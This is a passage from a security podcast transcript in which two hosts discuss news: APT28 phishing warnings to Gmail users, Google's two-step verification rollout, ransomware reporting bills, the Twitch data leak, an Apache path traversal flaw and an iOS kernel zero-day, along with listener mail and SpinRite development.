Thanks to Microsoft's cross-embedding, it's entirely possible, and it often happens, that a Word doc will have an embedded Excel invocation in the form of an ActiveX object, also known or previously known as OLE, which allows the Excel functionality to be imported into a .doc file where an XLM macro will happily run and do whatever the bad guys have set it up to do.  So again, Microsoft really doesn't want to break anything by disabling this, worried of the consequences, which I understand.  But people are being hurt by it.



Google recently sent warning notices to more than 14,000 users of Gmail, warning that:  "Government-backed attackers may be trying to steal your password."  In a longer note, I have a screenshot of what was sent to everybody in the show notes.  Basically it says, you know, they wrote:  "There's a chance that this is a false alarm, but we believe we detected government-backed attackers trying to steal your password.  This happens to less than 0.1% of all Gmail users.  We can't reveal what tipped us off because the attackers will take note and change their tactics.  But if they are successful, at some point they could access your data or take other actions using your account.  To further improve your security, based on your current settings, we recommend...."  And then they have, I guess this is sort of a depending upon who you are.  And in this instance it said:  "You're a security pro.  Just keep Microsoft Word up to date, or open Microsoft Word documents with Google Docs."



So as I said, these notices were sent to notify Gmail users that they've been the target of a spear-phishing attack orchestrated by a state-sponsored hacking group.  Now, I'm familiar with the term "apex predator," and the idea sort of gives me chills.  Wikipedia says:  "An apex predator, also known as an alpha predator or top predator, is a predator at the top of a food chain, without natural predators."  But until now I've never encountered the term in the context of the security industry. But we now have what are being called "Apex Threat Actors," and their tracking and identification is the mission of Google's TAG team.  TAG of course is Google's Threat Analysis Group being led by Shane Huntley.  We've been mentioning the TAG team often recently because they've been locating and reporting many very valuable vulnerabilities in everyone's software.



Shane told a reporter for The Record that:  "In late September, we detected an APT28" - and of course that should be a familiar number to our listeners - "an APT28 phishing campaign targeting a large volume of Gmail users, approximately 14,000 across a wide variety of industries.  This particular campaign," he said, "comprised 86% of the batch of warnings we sent this month.  These warnings indicate targeting, not compromise.  If we are warning you," he said, "there's a very high chance that we blocked the attempted hack."  And indeed, in this case all attempts were blocked.  Huntley added that:  "If you are an activist/journalist/government official or work in national security, this warning shouldn't be a surprise."



LEO:  I'm feeling kind of left out, to be honest.



STEVE:  Awww, yes.  Leo, we could send each other...



LEO:  I get Apple invitations now, but I still don't hear from Google ever.  I don't know.



STEVE:  Well, hey, that's progress.  You're getting Apple invitations?



LEO:  Yeah, to their streams.  Big deal; right?



STEVE:  Oh.  Not to attend...



LEO:  Not to go anywhere.



STEVE:  Not the Steve Jobs Auditorium.  Anyway, he said at some point some government-backed entity will probably try to send you something.



LEO:  A little gift horse from all of us here at Kremlin.  Enjoy.



STEVE:  Frankly, Leo, I count myself lucky that I'm not receiving those notices.  I'm much happier to be under the radar.



LEO:  Well, now we know what APT28 stands for, Apex Predator Team or something like that; right?



STEVE:  Oh, that's interesting.



LEO:  No, no, no, Advanced Persistent Threat.



STEVE:  It's Advanced Persistent Threat, yes.  Anyway, the APT28 group is known by many names, including most popularly, or at least most fun, Fancy Bear, which both the FBI and the NSA directly link to Russian military intelligence apparatus, and in particular to the Russian General Staff Maintenance Intelligence Directorate, also known as the GRU, the 85th Main Special Service Center, GTsSS, Military Unit 26165.  Whoa.



So the APT28 / Fancy Bear name comes up often because they've been one of the most active threat actors over the past decade, and the group has often relied on spear-phishing emails in pursuit of targets of interest.  Their aim is to breach inboxes, get access to sensitive documents and communications, then pivot to other individuals or internal networks.  Anyone receiving one of these email warnings, or anyone who might be a high-value target, a journalist, politician, celebrity, or CEO, is strongly advised to consider enrolling in Google's Advanced Threat Protection for work and personal emails.  The Advanced Threat Protection adds and activates additional security protections for high-risk accounts.



And although we're talking about this particular instance, such warnings, for what it's worth, are not a new Gmail feature.  Google's been sending alerts of this sort about attacks carried out by state-sponsored entities for about a decade, almost, since 2012.  So anyway, just cool that they're being proactive.  I think that's good.  And clearly if something trips their alarm, they're recognizing behavior.  And, wow, you know, 14,000 specific individuals that were being in this instance specifically targeted by a concerted attack by a single threat actor.  And I'm being attacked by my dry throat, Leo.



LEO:  Thirst.  Thirst.



STEVE:  So I'm going to deal with that.



LEO:  I'll have to show you this at some other point, but whitehoodhacker.net is a blog by a high school kid who rickrolled his entire high school district as a senior prank by hacking all the IoT devices, and played Rick Astley's "Never Gonna Give You Up" in talent shows, in Zoom calls, in presentations.  He says:  "I did it by hijacking every networked display in every school in the Township High School District 214 - that's six different schools, 11,000 students - to broadcast 'Never Gonna Give You Up' in perfect synchronization, whether it was a TV in the hall, a projector in a classroom, a jumbotron displaying the lunch menu.  If it was networked, I hacked it."  Yeah, I'm sure this is his resume, whitehoodhacker.net.  It's hysterical.  



STEVE:  Oh, my goodness.  Absolutely.  Absolutely.



LEO:  I'm sure, I imagine he got in a little bit of trouble.



STEVE:  Yeah.



LEO:  But he has pictures from all over the school of Rick Astley getting...



STEVE:  Wow.  Very cool.  So as I mentioned at the top, back on May 6th, Google posted a blog posting titled "A simpler and safer future without passwords," which stated that they were embarking on a campaign to auto-enroll all of their users in two-step verification, which they called 2SV.  Note that they call this 2SV as opposed to the industry's 2FA, for two-factor authentication.  It always sort of trips me up.  I have to like, okay, wait, two-step verification.  Doesn't seem natural to me yet.  But I guess in time.  And at the time...



LEO:  Oh, they want to say that because I think it may not exactly be two-factor.  You know what I'm saying?



STEVE:  Right.



LEO:  It takes you two steps, but it could be things you know both times.  So I think that's why they call it two-step.



STEVE:  Yeah.  Or maybe just a little bit of NIH.  I don't know.  Anyway, at the time I noted that I wished them luck, since this whole auto-enroll all of their users was sure to be a heavy lift.  Well, a week ago, last Tuesday the 5th, they explained how the first step of this campaign was going to happen, and that it was underway, with their posting titled "Making sign-in safer and more convenient."  Okay, well, at least safer I would agree with.  But there's nothing more convenient about it, if they're only adding steps, as they are, without removing any steps.  What makes SQRL, for example, truly convenient by comparison is that it completely replaces both identification and all authentication with its single step.  But in any event.



Google has announced their plans to auto-enroll 150 million user accounts by the end of this year into their two-step verification system.  It turns out these are accounts where Google's - I just hate that 2SV.  I don't know, I just stumble on that every time I hit it - where Google's 2SV login can be enabled, but where users have not done so on their own.  Google wrote:  "Right now, we are auto-enrolling Google accounts that have the proper backup mechanisms in place to make a seamless transition to 2SV."



Okay.  Now, by "proper backup mechanisms in place" I assume Google means that when they break something by doing this unilaterally there will be some reasonable recovery path.  And I really do appreciate Google's position on this.  What we know is that users won't budge.  They just won't.  You know, yeah, yeah, yeah, everything's fine.  Don't bother me with whatever you're selling.  That's users.  But they'll surely squawk loudly if someone sneaks into their Google account and starts mucking around with their life.  So to make this happen, Google is going to need to be proactive.  I get that.  And it's for their users' own good, even if Google needs to get all up in their face with this.



So Google's posting explains that this will apply to users with modern smartphones that run recent versions of Android.  Once Google proactively and unilaterally enables the 2SV feature, users will be asked to confirm a prompt that appears on their Android smartphone every time they log into their Google account on a new device, app, or browser.  And that certainly seems reasonable and not that burdensome.  And it would certainly go a long way toward preventing a large class of current remote abuse.  And if Google has end-around access to the registered smartphones running their Android OS, their own OS, which enables them to send and receive a real-time push notification, this shouldn't be a big problem.  Mostly it's just going to be like a surprise to users, like wait, what?  Now I have to do what?  On the other hand, only I guess if a user tries to log in on a device where they haven't previously, you know, it hasn't been tagged already by Google as approved.



So today's announcement is the first step in Google's ambitious plan to enable 2SV login support for all of its users by default.  This is just the start.  As part of Google's long-term goal, more users will have 2SV enabled on their accounts going forward as part of what they say is going to be a carefully executed, staggered rollout plan to avoid large breakage.  I still think this is going to be an ambitious and heavy lift.  It'll be interesting to see what comes next, since this one, you know, basically using a recent version of their own OS on a device that the user has registered with their account where enough backup information is present in order to keep it from being a problem.  And I guess they've identified that as 150 million of their users.  That was the easy one to do.  What are you going to do for iOS users?  Or desktop users?  It'll be interesting to see what they have in store for that.



The U.S. Senate has approved some hacking and ransomware legislation, not yet signed into law.  But because both houses of Congress appear to be in sync on this, it shouldn't be a big problem.  Last Wednesday the U.S. Senate's Homeland Security Committee advanced two bills which are aimed at boosting the U.S. government's insight, meaning their reporting requirements, into cyberattacks on critical infrastructure operators and the private sector, as well as federal agencies.  By a voice vote, the Committee approved the Cyber Incident Reporting Act, which would give critical infrastructure owners and operators up to three days, 72 hours, to report hacks, and 24 hours to disclose ransom payments.



The Senate Homeland legislation mirrors a bipartisan measure from the House's Homeland Security Committee that was attached to the House's annual defense policy bill as an amendment.  The fact that the bills in each chamber of Congress are aligned suggests that we're going to get that agreed to and signed into law.  The Senate bill took on ransomware by requiring organizations, including businesses with more than 50 employees, nonprofits, and state and local governments, to notify the CISA if they make a ransom payment.



Now, that was the original bill.  The Committee rejected an amendment that would limit the scope of ransom payment reporting to critical infrastructure operators.  So it ends up being broader.  Many members voiced concern that the mandate would prove burdensome to small businesses.  However, the lawmakers adopted by voice vote an amendment that would, among other things, exempt religious organizations from having to report ransom payments.  And the Committee later adopted an amendment which would use the Small Business Act's definition for "small business concerns" to exempt small businesses that meet that definition from having to comply with the ransom payment reporting requirement in the bill.  I don't really know why that's burdensome for a small business.  But at least, Leo, you and I ever get attacked, I'm sure we qualify as small.  You know, it's like 50 members, but it's not strictly 50 employees.  It provides a little more leeway for fudging.  The definition does not set a fixed threshold, as I mentioned, for the number of employees for the business.



So before long enterprises which do not meet the Small Business Act's definition for small business will be required, by law, to report any ransom payments made to ransomware operators or their affiliates.  And all operators of critical infrastructure will also be required to report any and all hacks of their facilities within three days.  So I guess it's not surprising that these are not controversial, and as a consequence they're moving through Congress without much problem.



As our listeners may know, since it's certainly been in the news, Amazon's Twitch service was hacked big-time.  Last Wednesday we learned that Twitch suffered a major breach, and that they first learned of it when 120GB of their internal proprietary data appeared in a massive online Torrent anonymously released on 4Chan.  Twitch said that no user passwords or credit card numbers were exposed.  But if that's true, it was about the only thing that wasn't.



They said:  "At this time we have no indication that login credentials have been exposed.  Additionally, since full credit card numbers are not stored by Twitch, full credit card numbers were not exposed."  Now, the wording of that does sort of sound as though perhaps they have been keeping the last four digits, which is a common method of allowing a user to select a blinded card number.  In any event, they said that they had reset all stream keys as a result of the incident, so those were lost to this breach.  So users who stream to Twitch would need to obtain a new stream key from their Twitch profile backends.  And Twitch is owned by Amazon.  So they said that while it's still investigating the breach, it believes the breach occurred due to "an error in a Twitch server configuration change" - yeah, when have we heard about a configuration change being a problem?



LEO:  It's always, isn't it, an error in the configuration.  Seems like that's always the case.



STEVE:  Yeah, "that was subsequently accessed by a malicious third party."  Yeah, no kidding.  So the massive data repository which was breached contained the entirety of Twitch.tv, with commit history going back to its early beginnings.  Meaning all of its source code.  Mobile, desktop, and video game console Twitch client source.  Various proprietary SDKs and internal AWS services used by Twitch.  Every other property that Twitch owns, including IGDB and CurseForge.  An unreleased Steam competitor from Amazon Game Studios.  Whoops.  Twitch SOC internal red teaming tools.  And creator payout reports from 2019 through today.



LEO:  That's what got the most attention, of course.



STEVE:  Yes.  And we're talking millions of dollars at the high end.



LEO:  There's good money in that, yeah.



STEVE:  Yeah, of those payouts.  So among the treasure trove, the most sensitive folders are the ones containing information about Twitch's user identity and authentication mechanisms, admin management tools, and data from Twitch's internal security team, including white-boarded threat models describing various parts of Twitch's backend infrastructure.  There were actually photos that were taken of a whiteboard showing all of the interconnected block diagrams of the threat models, basically the way they see that people could get in.  And I saw one that was redacted.  It wasn't redacted in the breach.



The unknown leaker promised to release more data, claiming that this was only the first batch, but they didn't provide a timeline, and there isn't any sense for what more is available.  It's like, well, wait a minute.  There's anything that wasn't released?  The threat actor said they leaked the data in response to Twitch's poor handling of "hate raids," which are bot attacks that have flooded the chats of top streamers with abusive content.  Although part of what was leaked shows that Twitch was getting ready to deal with that trouble.



The source of the leak appears to be an internal Git server whose domain name is git-aws.internal.justin.tv.



LEO:  Hi, Justin.



STEVE:  Uh-huh.



LEO:  Actually, Justin.tv was the original name of Twitch, so it might just be that.



STEVE:  Exactly.  Justin.tv was the name, as you said, of the original company prior to its rebranding as Twitch.  Since this occurred 10 years ago, back in 2011, that suggests that that Git server may have been part of some very old infrastructure that hadn't had much attention for the last decade.  The leaker labeled this, as I said, "part one," suggesting that more data might be forthcoming in the future.  And the biggest question which many security researchers pointed to is why no alarms were triggered, not only as a result of the deep internal compromise this represents, but also during the exfiltration of 125GB of the organization's highly proprietary data.  That's a chunk of data, and they had no idea that had been exfiltrated until it was found in a torrent posted online.  So, ouch.



LEO:  Yeah.  I don't know if you met Justin at Gnomedex when we were there.  But Justin Kan, who was the founder of Justin.tv, was a friend of the network.



STEVE:  Oh, cool.



LEO:  And iJustine was one of their - he was a life streamer.  And then iJustine went on.  Then they called it iJustine.tv, I guess, I don't know.  But, yeah, he did all right.



STEVE:  Cool.



LEO:  Sold it to Amazon, yeah.



STEVE:  Good for him.  A major Apache web server update introduced a new critical zero-day error.  The newly introduced vulnerability was discovered and reported to the Apache team by security researcher Ash Daulton and the cPanel Security Team on Wednesday, September 29th.  It was being actively exploited in the wild, so it was a true zero-day.  And consequently the fix for it was pushed out very quickly.



It's unclear how long the vulnerability was being exploited.  But the Apache group was asked, and they sort of sidestepped the question in a written reply by saying:  "As Apache HTTP Server 2.4.49" - that's the bad one - "was only released a few weeks ago, it's likely many users will not have upgraded yet."  Okay, well, we have a count.  But hold on.  They continue:  "If and how this issue can be exploited is highly dependent on how users will have configured the server.  If you're using 2.4.49, it is recommended that you upgrade to the latest version instead of using access control configuration as a mitigation.  On a default installation, an attacker could still use the flaw to obtain the source code of interpreted files like CGI scripts."



Okay, now, what happened was that the release of Apache HTTP Server version 2.4.49 fixed a slew of security flaws including a validation bypass bug, whoops; a null pointer dereference, that's good for a crash; a denial-of-service issue; and a severe server-side request forgery vulnerability.  But the major update also inadvertently introduced a separate, new, critical issue:  a path traversal vulnerability that can be exploited to map and leak files.  The developers wrote:  "An attacker could use a path traversal attack to map URLs to files outside the expected document root.  If files outside of a document root are not protected by 'require all denied' access control, these requests can succeed.  Additionally, this flaw could leak the source of interpreted files like CGI scripts."



So Positive Technologies has reproduced the bug.  And Will Dormann, the vulnerability analyst at CERT Coordination Center, says that:  "If the mod-cgi function is enabled" - and we'll note it typically is - "and the default 'require all denied' function is missing, then the vulnerability is as RCE" - meaning remote code execution - "as it gets."



So the new trouble only impacts this Apache 2.4.49, which was, as I noted, only a few weeks old.  Even so, as of last Wednesday, approximately 112,755 Apache servers were running the vulnerable version, with roughly 40% of those residing in the United States.  So first off, props for those running Apache for, like, jumping on a new version quickly.  Unfortunately in this case it kind of may have bitten some people because this thing was being exploited, apparently immediately, in the wild.  On the other hand, that also suggests that now that 2.4.50, the fix, which only took five days to be released, it came out on October 4th, that suggests that they will all as quickly be moving themselves up to 2.4.50 and then be safe.  So, you know, this is the problem with our software, right, is that sometimes regression errors sneak in.  We fix a bunch of things, but break some other things.  And if they're found, that can create a problem.



Okay.  During last week's six-hour Facebook services outage, the alternative Signal and Telegram secure messaging platforms struggled to keep pace with the deluge of new users jumping ship from WhatsApp as they looked for an alternative.  Unfortunately, some of those services' new users experienced some lagging service and trouble, since as we've seen when this happened  before, both the Signal and Telegram services struggled to keep their own heads above water amid the roaring new demand.  This isn't the first time we've noted that new-user sign-up processes might not be scaling as well as they should.



Signal tweeted:  "Signups are way up on Signal.  Welcome, everyone.  Millions of new people have joined Signal today, and our messaging and calling have been up and running, but some people aren't seeing all of their contacts appear on Signal.  We're working hard to fix this up."  Since the WhatsApp outage was providing a hard "no" for its use, as opposed to being a little flaky, right, I mean, it was gone, even services that may have been limping along at times were better than nothing.



Pavel Durov, who's Telegram's CEO and founder, noted that more than 70 - seven zero - million new users joined Telegram in a single day following Facebook's outage.  He added that this massive deluge of millions of new users led to performance issues as they were all trying to sign up on the messaging platform at the same time.  Pavel said:  "The daily growth rate of Telegram exceeded the norm by an order of magnitude, as we welcomed over 70 million refugees from other platforms in one day.  I'm proud of how our team handled the unprecedented growth because Telegram continued to work flawlessly for the vast majority of users."



So, yup, not much loyalty there.  I suppose, I mean, if you live in WhatsApp, if you depend upon it, and an hour goes by, ouch.  And then two, ouch.  And then three.  At some point you're just going to say, okay, screw this.  Let's all go somewhere else.  A bunch of people chose Signal.  A bunch of people chose Telegram.  Well, you know, 70 million plus people chose Telegram.  And you've got to wonder, I mean, I'm sure there are people who are still over on WhatsApp, so it probably created a fragmentation of messaging once WhatsApp was back up and on the air after a total of six hours.  Still, there were probably some losses that won't be wandering back anytime soon.



I wanted to close the loop, sharing some of what our listeners have sent to me.  I received a Twitter DM from a listener who asked, he said:  "Steve, I listen every week, but a lot is over my head.  You would help people like me if you did a short segment on Win versus Mac.  That is to say, since my Windows computer is old and cannot get Win11, instead of buying a new Win computer, what about a Mac?  Trade-offs?  Your thoughts.  Thanks."



Okay.  So first of all, as we know, all past evidence suggests and all new evidence confirms that Microsoft appears to have set the Windows 11 CPU requirements bar quite high.  I've heard from many people with recently purchased machines, I mean, like heavy-duty gaming machines, they've got late-model chips, and Win11 says, uh, no.  And as I've mentioned, I have a lovely, recently purchased Intel NUC which is by no means old.  It runs Windows 10 like greased lightning with a fast 2.6 GHz quad core i7-6670HQ processor with 32GB of RAM and TPM 2.0.  There's absolutely no reason for that machine not to gleefully run Windows 11.  But so far Microsoft has said no, which is ridiculous.  I expect that this might change once they have pushed as many people as they can up to newer hardware.  Once that's done, maybe they'll relax the requirements in the interest of resynchronizing everyone under Windows 11.



They'll say something like:  "We've finally finished performing further testing on older hardware, and we've confirmed additional compatibility."  Ah.  What do you know?  "So we're further relaxing the requirements.  We can now state confidently that, if a machine runs Windows 10, it'll be able to run Windows 11 without problems."  So, you know, that appears to be true today.  But Microsoft wants us to play along for now.  We still have four years of Windows 10 support, and four years feels like longer than maybe they'll be willing to wait before they move to reunite everyone under Windows 11, especially in light of things like the presence of the "AllowUpgradesWithUnsupportedTPMOrCPU" registry key.



In my opinion, under no circumstances should you, the person who tweeted me, purchase a new computer for the sake of running Windows 11.  That lovely Intel NUC I mentioned has a wide screen where it's much more fitting to place the taskbar against the screen's left-hand edge. But at the moment, Windows 11 says no to that.



If a lot of this podcast's content feels like it's a bit over your head, I suggest that you might not be ready for a move to one of the Linux desktop environments which, while certainly discoverable, are still a bit less handholding than either Windows or macOS.  So, I would say that remaining right where you are, presumably with Windows 10, for the next four years of Windows 10 remaining service life, to see whether Microsoft discovers that, what do you know, Windows 11 is so good that it works everywhere after all.  I wouldn't be a bit surprised.



Mark James Wilcox said:  "Just remember the timeline of Windows."  I got a kick out of this because of course all long-term Windows followers are aware of this.  "3.1 good, 95 bad.  98 good, Millennium bad.  XP good, Vista bad.  7 good, 8 and 8.1 bad.  10 good, 11...  Who knows if this is going to follow a pattern?"



Oh, and I got a big kick out of several people who tweeted.  I only grabbed one of them, Philip Le Riche.  He said:  "@SGgrc (SN-839)."  He tweeted:  "I don't believe it!  I thought I was the only person on the planet still using PSP6."  Of course he's referring to my reference last week to Paint Shop Pro, which remains my go-to bitmap editing software.  He said:  "Simple, does 95% of common tasks."  And he says:  "I'd use the Gimp, but learning curve too steep for occasional use."



And so I replied to Philip with a shorter version of "Yep, Paint Shop Pro v6, the best, cleanest, and most straightforward bitmapped graphics editor for Windows ever.  I also own PSP7, which was the last one before Corel bought it and ruined it.  But I didn't like what JASC" - JASC was the original publisher of Paint Shop Pro - "did to PSP7, so I returned to v6.  I use a couple of plugins, Eye Candy, with another which does more highly optimized image saving.  Any images that appear anywhere on GRC, any that you ever see me post, were tailored, trimmed, and produced by Paint Shop Pro v6.  Nothing beats it.  And I'm glad to know that I'm in good company."



A bit of errata from last week's statement about Apple's new "Invasion" series, which I said would be starting last Friday.  Whoops.  Make that Friday after next, the 22nd, October 22nd, as I originally said the first time I mentioned it.  I just made a mistake last week.  And I haven't yet...



LEO:  You got my hopes up, too, by the way.  I thought, oh, I can't wait to watch it tonight.  And no.



STEVE:  Yup.  Yup.  And I've not watched the fourth installment of "Foundation."  I assume you have, Leo?



LEO:  Not yet.  But I like it.  I'm liking it.



STEVE:  Well, there we go.



LEO:  I think I started Episode 4, but I haven't finished it yet.



STEVE:  I rest my case.



LEO:  They never did explain the weird ending on Episode 2.



STEVE:  I know.



LEO:  Ever.  Right?  I don't think they ever did.



STEVE:  No, they didn't.



LEO:  Apparently the book doesn't either.  So we just have to figure that one out.



STEVE:  No, the book doesn't have that happening.



LEO:  It doesn't happen in the book?



STEVE:  It has like a whole different storyline.



LEO:  Okay, all right.



STEVE:  Okay.  So last week I shared my decision to rework and rewrite SpinRite's benchmarking technology.  Today I very nearly have all that work done.  Actually, I was pushing over the weekend, hoping to get it done before the podcast.  I got close, but not quite there.  Anyway, I am so glad that I decided to go this route.  The new UI display for the new benchmark is designed, and I'm rolling along very nicely with the implementation of the new system.  Rooting out all of the old code was very gratifying, since it embodied a number of kludges which had long since worn out their welcome.  But they were required, as I explained last week, until the use of that flaky old counter/timer could be reliably retired and replaced by using the clean and solid up-counter clock which we've now had for some time.



I'm working on the code to dynamically display the ratio of the accumulated bytes transferred to the accumulated total benchmark time.  Thus, as the benchmark runs, both of those baselines extend, and their ratio will settle down into the result.  Since the drive speeds it will be encountering will run from the very old to the solid-state, that code needs to dynamically scale to handle bytes, kilobytes, megabytes, gigabytes, and terabytes per second, while being careful to do the math in such a sequence that preserves the greatest number of significant digits.  So I expect to have it all nailed down and tested in another day or two, after which I'll release it to the gang in the GRC newsgroup to pound on.



And I'm excited about that since this will be the first widespread testing of SpinRite's new IO abstraction system, which is now fully implemented.  And, you know, I've had it running here for quite a while, but it hasn't had wider testing.  And at that point every single piece of code that I've written so far, although I actually had written more of the data recovery portion before, remember, I sort of got to feel like, okay, it's been too long since this thing's had any testing.  So I stopped, went back, and I brought that all current.  So anyway, that's where we are, making great progress.  And Leo.



LEO:  Nice.



STEVE:  Once again, progress on rehydration, and then we're going to talk about zero-day angst.



LEO:  Zero-days, yeah.  All right.  Zero-days and Apple.



STEVE:  So as I said at the top, I was originally planning to lead with this topic, under the podcast's "Zero-Day Watch" heading.  But it sort of grew into more than that.  Okay.  So first of all, it's Apple's turn.  Apple has just patched iPhone zero-day in iOS 15, and it's an authentic zero-day because it is being exploited in the wild.  It's tracked as CVE-2021-30883.  The zero-day resides in the IOMobileFramebuffer, which is a kernel extension that allows app developers to manage a device's screen framebuffer, as it's called, which is memory.  And as a consequence of this flaw, malicious applications were able to execute arbitrary code with kernel privileges thanks to using this vulnerability.  And as we know, running one's own malicious code with kernel privileges gives the attacker full control over the device.



As always, Apple is mum about the technical details of the vulnerability, or about how the vulnerability was being leveraged.  However, an unrelated security researcher immediately posted a detailed technical teardown on GitHub based upon his discovery from comparing the pre- and post-patched code.  As we've noted before, "bindiffing," as it's called, is the practice of comparing a compiled binary file containing a now-known vulnerability which has been fixed to the same compiled binary after it has been patched and repaired.  In other words, the repair changes the file.  So BinDiff stands for binary difference.  So by comparing, by like scrutinizing where the file is different, and then reverse-engineering that region of the code, it's often the case that the problem that was fixed is revealed.



In this case the researcher wrote:  "In the last iOS security update 15.0.2, Apple fixed a vulnerability in" - and by the way, this was just yesterday - "a vulnerability in IOMobileFramebuffer/AppleCLCD, which they specified was exploited in the wild.  This attack surface is highly interesting because it's accessible from the app sandbox, so it's great for jailbreaks," he wrote, "and many other processes, making it a good candidate for LPE exploits in chains," he says, 



"WebContent, et cetera."  And of course LPEs are Local Privilege Elevations.



He says:  "Therefore, I decided to take a quick look, bindiff the patch, and identify the root cause of the bug.  After bindiffing and reversing, I saw that the bug is great, and I decided to write this short blog post, which I hope you'll find helpful.  I really want to publish my bindiff findings as close to the patch release as possible, so there will be no full exploit here.  However, I did manage to build a really nice and stable proof of concept that results in a great panic at the end."  He said:  "Sorry in advance for any English mistakes.  I prioritized time over grammar."  And he says:  "Good thing we have automatic spell checkers."



So anyway, he then proceeds with a very long - and I forgot to mention I have the link in the show notes for anyone who wants to see the whole thing - a very long and satisfyingly detailed breakdown of the now fixed, or for those not yet patched, soon to be fixed in your devices update.  When I checked my iPhone, it was still back - this is an iPhone, what do I have, an 11.  It was still back on the last - wait.  I have an iPhone.  I forgot, Leo.  Where are we with iPhones?  I've got, like, one back from what they most recently did.  I can't remember.  I don't even know what iPhone number I have.  Anyway, when I checked my iPhone, it was still back on the last version 14 release, that is, of iOS.  So I updated it to v15.0.2, which has this problem solved.



Okay.  Since we now have a "Zero-Day Watch" section of this podcast, and since we've been counting the Chrome and Chromium zero-days year-to-date, we just talked about one last week, I think it's only fair to note that this latest zero-day in iOS brings Apple's year-to-date count to 17.  So more than Chrome/Chromium.  I've got a list of all of them in the show notes.  Given the big target that every web browser presents, and the fact that the other zero-day march we've been following is the world's leading web browser, Chrome, it should not come as any surprise that 10 of those 17 zero-days in iOS were discovered and fixed in Apple's WebKit browser component.  Again, this is the component which is out on the front lines, is receiving script from websites you visit, which are not necessarily trustworthy, and also receiving script from things those websites import, ads and other third-party content.



So one point of interest was brought out by this researcher, who noted that the July 26th zero-day, which I've got listed above, CVE-2021-30807, was also an IOMobileFramebuffer zero-day impacting iOS, iPadOS, and macOS.  So one wonders whether, once Apple removed that earlier zero-day in the framebuffer module, those attackers may have simply switched to using another zero-day they already knew of and had at the ready in the same module.  In any event, stepping back from this a bit, I think it's clear that the engineering practices surrounding the creation and maintenance of the best-designed software, which is what I would argue Apple and Google are both capable of producing and do produce where it matters most, has become so secure that the world's users should feel completely safe using it.  But at the same time, that software has become so complex that our current development methodologies, languages, and toolsets clearly fall short of creating perfect software.



So does software have to be perfect?  Perfect software doesn't support a running total of zero-days so far seen this year.  And those tiny imperfections give the likes of Israel's NSO Group, with their Pegasus smartphone spyware, just enough of a toehold to enable highly targeted attacks against the world's highest value targets.



At this stage in the development of the Internet and the use of personal connected devices, predominantly smartphones, what Google has created and accomplished with Android has been phenomenally valuable to all mankind.  And placing sharing first, doing it all in plain sight for the world to see and benefit from, to examine and unfortunately to also attack, whether it's Android or Chromium, is significantly more difficult than working to keep everything a tightly locked-down secret.  This sort of development in plain sight, you know, I mean, it's tremendously beneficial.  But it allows the bad guys to see what's going on, too.  At the same time, if one's goal, rather than altruism, is profit, secrecy has its place.



Apple, whose products are as proprietary as they're capable of being, made a serious strategic security blunder when they chose to share code between iOS and macOS.  Sure, it made huge economies of development.  Why continually reinvent the wheel on separate platforms?  But the security of iOS is arguably far more critical than that of macOS.  Yet by merging and sharing their codebases, iOS's security has been reduced to the lowest common denominator.



In that list of Apple zero-days so far this year, I highlighted in red those shared by macOS and iOS.  Of the total 17, 10 again were zero-days present in both OS platforms.  Want to place a bet where those zero-days were first discovered?  After the merging of Apple's codebases, we've encountered many examples, we've talked about them on the podcast, where researchers and attackers were able to reverse engineer the code first on the unprotectable and far more accessible macOS platform - and, by the way, where they really couldn't care less about a vulnerability on macOS - then pivot with what they learned there, to the far more valuable iOS platform, knowing that the same vulnerabilities, though unseen so far on iOS, were likely to exist there, too.



The advantage Apple had, and unfortunately squandered, was that any code running on an iDevice is inherently far more easily protected, hidden, and kept secret.  The favorite slogan "Security through obscurity is not security" makes for a catchy phrase, but it's not quite true.  Some obscurity, any obscurity, is better than none.  And at some point, sufficient obscurity becomes secrecy.  "Security through secrecy" does provide true security.  After all, we all keep passwords and private keys secret which, notwithstanding other errors in their management, keeps them secure.  Apple's iDevices today are measurably less secure than those of the past because keeping their code secret had true security value.  And that's been lost.



Although Google's device security does suffer from its total openness, the openness of its Google Play Store and its support for sideloading completely uncurated applications, you know, that's tough.  Google's efforts are providing far more benefit to the world at large than Apple's.



I titled this podcast "0-day Angst" because I wanted to place the issue of zero-day vulnerabilities front and center and in a sober context.  Yes, it's true that despite everyone's best efforts, zero-days occur, and there's no reason to believe that the near-term future will see any change in that.  We're not going to reduce the features nor the complexity of our software.  No new bulletproof languages, development, or environment solutions are apparent.  And the truth is zero-days are more of an embarrassment to their publishers than a true global security threat.  And they're also inherently self-limiting.  The more they're used, the more likely they are to be discovered and eliminated.



Thanks to a great deal of effort being made by mainstream software publishers, aided by a massive, distributed, and growing community of security researchers, and even with some inadvertent help from the bad guys, today's devices, even though we absolutely positively know they still contain known and unknown vulnerabilities, are more than secure enough for nearly everyone to use without worry.  Only those very few who are likely to be targeted by nation-state actors have any real reason for concern.



So, yeah.  We'll talk about zero-day vulnerabilities.  We'll point them out.  We do need to keep them under control.  But by no means should anybody inconvenience themselves, for example, updating their iPhone from 14 point whatever the last one was, or the very first 15 to 15.0.2 today, because there was a problem that was known being found exploited in the wild.  It has to have been the case that that was being used by somebody in very tightly targeted attacks.  And that's just not going to affect most of us.  And Leo and I, you and I don't get email from Google telling us to duck.



LEO:  I think "high-value target" is the right word because these exploits I suspect are difficult to both discover and achieve, especially in iOS.  And as a result, they are pretty much reserved for the highest bidder.  I mean, it's hard, you know, they're hard to find.  If you find it, you sell it to NSO Group, and they're going to pay you millions because they're going to go on and sell it only to nation-states who will also pay millions to target a handful of individuals with zero-click exploits.  So I think that whole supply chain means it's really mostly likely, it's not ransomware gangs that are buying these or finding them.



STEVE:  No.



LEO:  It's researchers who are very good, very sophisticated who are finding them.  And instead of unfortunately selling them to Zerodium or even directly to Apple...



STEVE:  And they're quietly making themselves a good living, yeah.



LEO:  They're getting millions of dollars from people, unfortunately, like NSO Group, who probably outbid Zerodium.  And the reason they do is because they have high-price customers who will pay a lot of money.  



STEVE:  Yup.



LEO:  But they use them in such narrow ways that, you're right, I doubt it's a threat.  I actually - we talked about this on the radio show.  Somebody was worried.  And I said, unless you're working for a three-letter agency in McLean, Virginia, or you're a dissident in Turkey or Bahrain, you're probably okay.  Still, I'd get 15.0.2 as soon as I could.



STEVE:  Yeah.



LEO:  And I always tell Lisa, I said do 15.0.2.  And Apple, you know, they don't say, oh, you've got to do it.  They pop up things and stuff.  They just slowly eventually get everybody updated to the release.  



STEVE:  Yeah, I was still back on 14.



LEO:  That surprises me.



STEVE:  Yeah.



LEO:  They pushed 15 pretty hard.  But you must never check your update section.  So that's fine.



STEVE:  Yeah, I don't.



LEO:  You're happy.  You don't need it.



STEVE:  I am.



